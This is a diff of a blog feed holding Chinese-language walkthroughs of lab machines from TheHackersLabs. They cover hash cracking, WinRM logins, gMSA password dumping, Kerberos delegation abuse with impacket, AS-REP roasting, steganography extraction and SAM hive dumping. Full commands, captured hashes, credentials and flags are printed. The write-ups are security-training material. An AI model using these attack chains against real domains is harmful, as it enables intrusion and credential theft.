+Progress.........: 1572864/14344387 (10.97%)
+Rejected.........: 0/1572864 (0.00%)
+Restore.Point....: 0/14344387 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -&gt; lindarox
+Candidates.#2....: lindarous -&gt; efesio
+Hardware.Mon.#1..: Temp: 40c Util:  9% Core:1890MHz Mem:8000MHz Bus:8
+Hardware.Mon.#2..: N/A
+
+Started: Mon Dec 09 21:53:56 2024
+Stopped: Mon Dec 09 21:54:03 2024
+<br>爆破出来密码是 P@ssword1234!<br>winrm连接上去 sqlsvc P@ssword1234!<br>*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+<br><br><img alt="Pasted image 20241209220120" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220120.png" referrerpolicy="no-referrer"><br>
+<img alt="Pasted image 20241209220232" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220232.png" referrerpolicy="no-referrer"><br>
+可以发现 SQLSVC 用户是 GMSA_USERS 用户组的成员，而改组的成员可以获取 机器 GMSA_SVC$ 的密码<br>获取 GMSA_SVC$ 的密码<br>┌──(root㉿kali)-[~]
+└─# nxc ldap 192.168.56.8 -u 'sqlsvc' -p 'P@ssword1234!' --gmsa
+SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
+LDAPS       192.168.56.8    636    DC               [+] hackme.thl\sqlsvc:P@ssword1234!
+LDAPS       192.168.56.8    636    DC               [*] Getting GMSA Passwords
+LDAPS       192.168.56.8    636    DC               Account: GMSA_SVC$            NTLM: b7a596258a854cdcf1d44d42d877c3bb
+
+<br><br><br><img alt="Pasted image 20241209220716" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220716.png" referrerpolicy="no-referrer"><br>
+可以看到我们当前机器对DC具有 AllowedToAct 权限。即约束性委派<br>
+我们使用域账户 hackme.thl/GMSA_SVC$ 伪装为域管理员 administrator，并获取目标服务 cifs/dc.hackme.thl 的服务票据（TGS），然后通过服务票据滥用，实现对目标服务的访问权限
+<br>┌──(root㉿kali)-[~]
+└─# impacket-getST -spn cifs/dc.hackme.thl -impersonate administrator -dc-ip 192.168.56.8 'hackme.thl/GMSA_SVC$' -hashes ':b7a596258a854cdcf1d44d42d877c3bb' -no-pass
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+<br>
+但是我们这里出错了，原因是时钟偏差过大（Clock skew too great）。该错误通常发生在 Kerberos 客户端与 KDC（Kerberos 认证中心）之间的时间差异超过了 Kerberos 协议的容忍范围。
+<br>使用 rdate 同步域时间<br>┌──(root㉿kali)-[~]
+└─# rdate -n 192.168.56.8
+Tue Dec 10 05:17:34 CST 2024
+
+┌──(root㉿kali)-[~]
+└─# impacket-getST -spn cifs/dc.hackme.thl -impersonate administrator -dc-ip 192.168.56.8 'hackme.thl/GMSA_SVC$' -hashes ':b7a596258a854cdcf1d44d42d877c3bb' -no-pass
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_dc.hackme.thl@HACKME.THL.ccache
+
+<br>这样我们就获取到服务器管理员的服务票据（TGS）了<br>将票据导入环境变量<br>export KRB5CCNAME=/root/administrator@cifs_dc.hackme.thl@HACKME.THL.ccache
+<br>
+注意 这里需要写票据的绝对路径
+<br>然后利用 impacket-psexec 进行PTH<br>┌──(root㉿kali)-[~]
+└─# impacket-psexec HACKME.THL/administrator@dc.hackme.thl -k -target-ip 192.168.56.8
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+[*] Requesting shares on 192.168.56.8.....
+[*] Found writable share ADMIN$
+[*] Uploading file WroTUHgi.exe
+[*] Opening SVCManager on 192.168.56.8.....
+[*] Creating service fwyV on 192.168.56.8.....
+[*] Starting service fwyV.....
+[!] Press help for extra shell commands                                                                                        Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami                                                                                                    nt authority\system
+
+
+c:\Users&gt; type c:\users\Administrator\desktop\root.txt                                                                       24aff662fbb2ce2ecbf85daa79a396d9
+
+c:\Users&gt; type jdoe\desktop\user.txt                                                                                           bd548d24899423996c68a1a2e1e6bad
+
+]]></description><link>https://www.c1trus.top/24-渗透/thl/5.curiosity.html</link><guid isPermaLink="false">24-渗透/THL/5.curiosity.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.BIG]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
-<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a><br>
-难度 ⭐️️
-<br><br>┌──(root㉿kali)-[~/Desktop/Eternal]
-└─# fscan -h 192.168.56.19
+
+<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
+<br><a data-tooltip-position="top" aria-label="2.2. SMb空会话检测" data-href="#2.2. SMb空会话检测" href="https://www.c1trus.top/about:blank#2.2._SMb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">2.2. SMb空会话检测</a>
+<br><a data-tooltip-position="top" aria-label="2.3. kerberute爆破" data-href="#2.3. kerberute爆破" href="https://www.c1trus.top/about:blank#2.3._kerberute爆破" class="internal-link" target="_self" rel="noopener nofollow">2.3. kerberute爆破</a>
+<br><a data-tooltip-position="top" aria-label="2.4. 目录扫描" data-href="#2.4. 目录扫描" href="https://www.c1trus.top/about:blank#2.4._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.4. 目录扫描</a>
+
+
+<br><a data-tooltip-position="top" aria-label="3. big图片解密" data-href="#3. big图片解密" href="https://www.c1trus.top/about:blank#3._big图片解密" class="internal-link" target="_self" rel="noopener nofollow">3. big图片解密</a>
+<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
+
+<br><a data-tooltip-position="top" aria-label="4.1. 利用Bloodhound收集域内环境" data-href="#4.1. 利用Bloodhound收集域内环境" href="https://www.c1trus.top/about:blank#4.1._利用Bloodhound收集域内环境" class="internal-link" target="_self" rel="noopener nofollow">4.1. 利用Bloodhound收集域内环境</a>
+<br><a data-tooltip-position="top" aria-label="4.2. AS-REPRoasting" data-href="#4.2. AS-REPRoasting" href="https://www.c1trus.top/about:blank#4.2._AS-REPRoasting" class="internal-link" target="_self" rel="noopener nofollow">4.2. AS-REPRoasting</a>
+
+
+<br><a data-tooltip-position="top" aria-label="5. SAM转储" data-href="#5. SAM转储" href="https://www.c1trus.top/about:blank#5._SAM转储" class="internal-link" target="_self" rel="noopener nofollow">5. SAM转储</a><br>
+靶机链接 <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/b-i-g/" target="_blank">https://thehackerslabs.com/b-i-g/</a><br>
+难度 ⭐️⭐️⭐️⭐️️
+<br><br><br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# fscan -h 192.168.212.4
 
    ___                              _
   / _ \     ___  ___ _ __ __ _  ___| | __
- / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+ / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
 / /_\\_____\__ \ (__| | | (_| | (__|   &lt;
 \____/     |___/\___|_|  \__,_|\___|_|\_\
-                     fscan version: 2.0.0
-[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
-[*] 开始信息扫描...
-[*] 最终有效主机数量: 1
-[*] 共解析 218 个有效端口
-[+] 端口开放 192.168.56.19:139
-[+] 端口开放 192.168.56.19:445
-[+] 端口开放 192.168.56.19:135
-[+] 存活端口数量: 3
-[*] 开始漏洞扫描...
-[!] 扫描错误 192.168.56.19:139 - netbios error
+                     fscan version: 1.8.4
+start infoscan
+192.168.212.4:445 open
+192.168.212.4:139 open
+192.168.212.4:80 open
+192.168.212.4:88 open
+192.168.212.4:135 open
+[*] alive ports len is: 5
+start vulscan
+[*] NetBios 192.168.212.4   [+] DC:BBR\BIG
 [*] NetInfo
-[*] 192.168.56.19
-   [-&gt;] MIKE-PC
-   [-&gt;] 192.168.56.19
-[+] MS17-010 192.168.56.19      (Windows 7 Enterprise 7601 Service Pack 1)
-[+] 扫描已完成: 3/3
-[*] 扫描结束,耗时: 1.0239191s
+[*]192.168.212.4
+   [-&gt;]BIG
+   [-&gt;]192.168.212.4
+[*] WebTitle http://192.168.212.4      code:200 len:435    title:None
+已完成 5/5
+[*] 扫描结束,耗时: 1.939563155s
 
-<br><br>msfconsole
-use exploit/windows/smb/ms17_010_eternalblue
-set rhost 192.168.56.19
-set lhost 192.168.56.6
+┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# nmap -sCV 192.168.212.4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 16:00 CST
+Nmap scan report for 192.168.212.4
+Host is up (0.00026s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn''t have a title (text/html).
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-05 23:00:19Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+MAC Address: 08:00:27:AD:59:C2 (Oracle VirtualBox virtual NIC)
+Service Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2024-12-05T23:00:19
+|_  start_date: 2024-12-05T22:56:51
+|_clock-skew: 14h59m57s
+|_nbstat: NetBIOS name: BIG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:ad:59:c2 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds
+
+<br>配一下域名<br>192.168.212.4  bbr.thl big.bbr.thl
+<br>网站<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# curl http://192.168.212.4
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;style&gt;
+        /* It was all a dream */
+        body {
+            background-image: url('big1.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-position: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+    &lt;h1&gt;Music&lt;/h1&gt;
+    &lt;p&gt;I keep it music music, I eat that lunch (Yeah)&lt;/p&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+<br><br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# smbmap -u anonymous -H 192.168.212.4
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 0 SMB session(s)
+
+<br>不存在 smb空会话<br><br>尝试kerberute 爆破 <br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# kerbrute userenum -d BBR.BIG.THL  --dc 192.168.212.4  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 12/05/24 - Ronnie Flathers @ropnop
+
+2024/12/05 16:34:26 &gt;  Using KDC(s):
+2024/12/05 16:34:26 &gt;   192.168.212.4:88
+
+2024/12/05 16:34:26 &gt;  [!] info@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...
+2024/12/05 16:34:26 &gt;  [!] 2000@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...
+2024/12/05 16:34:26 &gt;  [!] john@BBR.BIG.THL - KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting...
+
+2024/12/05 16:34:26 &gt;  Done! Tested 20 usernames (0 valid) in 0.002 seconds
+
+<br>也不行，看来只能从网站入手了<br><br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# gobuster dir -u http://192.168.212.4 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,bak,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.212.4
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              jpg,php,html,png,zip,bak,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 151] [--&gt; http://192.168.212.4/images/]
+/contents             (Status: 301) [Size: 153] [--&gt; http://192.168.212.4/contents/]
+/songs                (Status: 301) [Size: 150] [--&gt; http://192.168.212.4/songs/]
+
+<br>扫出来有三个目录<br>
+我们优先看 contents 目录<br>对这个目录在扫描一下<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# gobuster dir -u http://192.168.212.4/contents -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.212.4/contents
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              jpg,php,html,png,zip,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/notify.txt           (Status: 200) [Size: 112]
+
+<br>获取到一个文档<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# curl http://192.168.212.4/contents//notify.txt
+Who the hell did you hire to create the website!
+Hiding keys in MD5 again!
+I'm going to fire that guy
+
+music                                                                                                                      
+翻译：
+“到底是谁给你们开发的网站！  
+又用 MD5 隐藏密钥了！  
+我要解雇那个家伙。”
+
+“music”
+<br>意思是有个秘钥被Md5加密了<br>
+还得到一个用户 music<br>在扫描一下 songs 目录下的文件<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# gobuster dir -u http://192.168.212.4/songs -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.212.4/songs
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/juicy.txt            (Status: 200) [Size: 3350]
+Progress: 415286 / 415288 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+<br>juicy.txt 是一个歌词文档 。没有什么东西<br><br>再看看另外的一个文件夹<br>
+┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# gobuster dir -u http://192.168.212.4/images -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -                                       x jpg,png
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.212.4/images
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              png,jpg
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/big4.jpg             (Status: 200) [Size: 196567]
+Progress: 622929 / 622932 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+<br>这有一个图片叫 big4.jpg 而且知道首页的图片是 big1.jpg<br>那我估计还有好几个big2、3、4、5、6之类的<br>
+尝试都下下来<br>经过测试 一共有4张图片<br>
+<img alt="big1" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" referrerpolicy="no-referrer"><br>
+<img alt="big2" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big2.jpg" referrerpolicy="no-referrer"><br>
+<img alt="big3" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big3.jpg" referrerpolicy="no-referrer"><br>
+<img alt="big4" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big4.jpg" referrerpolicy="no-referrer"><br>
+我内个大帅哥啊<br>这几张图片里面肯定是有东西的<br>
+对图片进行检测是否存在隐藏内容<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# stegseek --seed big2.jpg
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found (possible) seed: "c2726679"
+        Plain size: 43.0 Byte(s) (compressed)
+        Encryption Algorithm: rijndael-128
+        Encryption Mode:      cbc
+
+<br>对四个检测后发现 big2.jpg 存在隐写。但是需要密码才能解密<br>前面有提到密码是一个md5<br>
+之前网站源码里面是有一段关键的话的 It was all a dream<br>
+尝试对这个进行md5 然后使用md5运算后的值进行解密<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# echo -n 'It was all a dream' |md5sum
+99ae77c0c0faf78b872f9f452e3eaa24  -
+
+┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# steghide extract -sf big2.jpg
+Enter passphrase: 99ae77c0c0faf78b872f9f452e3eaa24
+wrote extracted data to "frase.txt".
+
+┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# cat frase.txt
+Bigpoppa1972
+
+<br>成功获取到一个字符串 应该是密码<br><br>利用 music : Bigpoppa1972  winrm登录上来<br>
+先看权限有没有可以利用的<br>*Evil-WinRM* PS C:\Users\TEMP\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+<br>没有看到可以直接用的<br><br>收集域内信息<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# netexec ldap 192.168.212.4 -u 'music' -p 'Bigpoppa1972'  --bloodhound --collection All --dns-server 192.168.212.4
+SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
+LDAP        192.168.212.4   389    BIG              [+] bbr.thl\music:Bigpoppa1972
+LDAP        192.168.212.4   389    BIG              Resolved collection methods: group, acl, dcom, session, rdp, psremote, container, trusts, objectprops, localadmin
+LDAP        192.168.212.4   389    BIG              Done in 00M 00S
+LDAP        192.168.212.4   389    BIG              Compressing output into /root/.nxc/logs/BIG_192.168.212.4_2024-12-06_083621_bloodhound.zip
+
+
+<br>导入进行分析<br>
+发现song用户是无预身份验证的账户<br>
+存在AS-REP漏洞<br>
+<img alt="Pasted image 20241205174333" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205174333.png" referrerpolicy="no-referrer"><br><br>因为song 是无预身份验证的账户 即禁用预认证的用户<br>
+禁用预认证的用户会向域控制器发送不包含加密的身份验证请求，因此攻击者可以捕获 AS-REP 响应并进行密码破解。
+<br>我们可以进行 AS-REPRoasting 攻击<br>
+在攻击之前先同步域时间<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# rdate -n 192.168.212.4
+Fri Dec  6 08:47:54 CST 2024
+
+<br>捕获 AS-REP 响应<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# impacket-GetNPUsers bbr.thl/song:123
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Cannot authenticate song, getting its TGT
+$krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729cd8e104cf$ce7dbe4474a7db21b21809a7af5f3416786079bc76f6f780dbea54769b28b03d04ca645a378eeddce0bee8615211f36cfeba66c4bf4c3b7c4adcc74b474482a977105c2d8571ff3b2393b5a61e1292c8ffa7b801ce0d76f1ae4d540ccabd7430f1f67175812a94ca527b707fc07644e6f22d2cba60f0f6e280b4f0f7dc28817df23202d8b9b81ca5d9a0ad02dcbed0a7d87b797236a902051c44a83ebe97f603b741754f36b1cbed5d9dd71d3cd82017db227d6a8004af1bf4007877cdcc2e7af7c83e60304973c0dcb5fbb98cebbe59334307b935065b1a4abbba83b5bb82cdb409
+<br>hashcat 破解发现用rockyou爆破不出来<br>
+可能是信息收集不够。 我们直接去看一下网站目录下有什么东西<br>*Evil-WinRM* PS C:\inetpub\wwwroot\songs&gt; dir
+
+
+    Directory: C:\inetpub\wwwroot\songs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/2/2024   4:54 AM           3535 BigPoppa.txt
+-a----         5/2/2024   4:54 AM           4280 Hypnotize.txt
+-a----         5/2/2024   4:54 AM           3350 Juicy.txt
+-a----         5/2/2024   4:54 AM           1793 Skyisthelimit.txt
+-a----         5/3/2024   2:06 PM            168 web.config
+
+<br>可以发现网站 songs 目录下我们少拿了很多文件<br>都下下来看看<br>
+发现 Skyisthelimit.txt 里面是一个密码字典<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# cat Skyisthelimit.txt
+123456
+admin
+12345678
+123456789
+1234
+12345
+password
+123
+Aa123456
+1234567890
+UNKNOWN
+1234567
+...
+
+<br>利用这个字典进行爆破<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
+└─# hashcat -a 0 -m 18200 as-rep.txt Skyisthelimit.txt
+hashcat (v6.2.6) starting
+
+
+$krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729cd8e104cf$ce7dbe4474a7db21b21809a7af5f3416786079bc76f6f780dbea54769b28b03d04ca645a378eeddce0bee8615211f36cfeba66c4bf4c3b7c4adcc74b474482a977105c2d8571ff3b2393b5a61e1292c8ffa7b801ce0d76f1ae4d540ccabd7430f1f67175812a94ca527b707fc07644e6f22d2cba60f0f6e280b4f0f7dc28817df23202d8b9b81ca5d9a0ad02dcbed0a7d87b797236a902051c44a83ebe97f603b741754f36b1cbed5d9dd71d3cd82017db227d6a8004af1bf4007877cdcc2e7af7c83e60304973c0dcb5fbb98cebbe59334307b935065b1a4abbba83b5bb82cdb409:Passwordsave@
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729c...cdb409
+Time.Started.....: Fri Dec  6 11:30:12 2024 (0 secs)
+Time.Estimated...: Fri Dec  6 11:30:12 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (Skyisthelimit.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   429.8 kH/s (0.07ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 201/201 (100.00%)
+Rejected.........: 0/201 (0.00%)
+Restore.Point....: 0/201 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -&gt; qwerty123456
+Hardware.Mon.#1..: Util: 13%
+
+<br>成功得到 song 用户的密码 Passwordsave@<br><br>利用账户密码登录上去 看一下 song 用户的权限<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+
+<br>发现存在 SeBackupPrivilege (备份文件和目录) 权限<br>
+那么可以进行SAM转储<br>在 song 用户的winrm客户端下<br>
+找一个可以下载的目录<br>
+转储sam 与系统注册表<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; reg save hklm\sam sam.hive
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; reg save hklm\system system.hive
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; dir
+
+
+    Directory: C:\Users\TEMP.bbr\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
